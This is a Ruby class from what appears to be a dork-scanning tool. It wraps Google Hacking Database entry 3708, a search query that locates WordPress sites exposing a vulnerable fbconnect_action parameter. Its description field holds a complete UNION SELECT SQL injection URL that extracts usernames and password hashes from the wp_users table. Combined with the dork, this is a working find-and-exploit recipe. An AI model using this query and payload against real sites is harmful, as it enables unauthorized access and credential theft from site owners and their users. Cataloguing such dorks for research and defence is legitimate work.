module Dorks
   class Dork3708 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 3708",
            ghdb_url: "https://www.exploit-db.com/ghdb/3708",
            severity: "5",
            category: "advisories_and_vulnerabilities.sqli",
            publish_date: "2011-04-05",
            author: "anonymous",
            dork: <<~EDORK,
inurl:"fbconnect_action=myhome"
EDORK
            description: <<~EDESC
Submitter: z0mbyak SQL Injection: www.site.name/path/?fbconnect_action=myhome&fbuserid=1+and+1=2+union+select+1,2,3,4,5,concat(user_login,0x3a,user_pass)z0mbyak,7,8,9,10,11,12+from+wp_users--
EDESC
         })

      end
   end
end
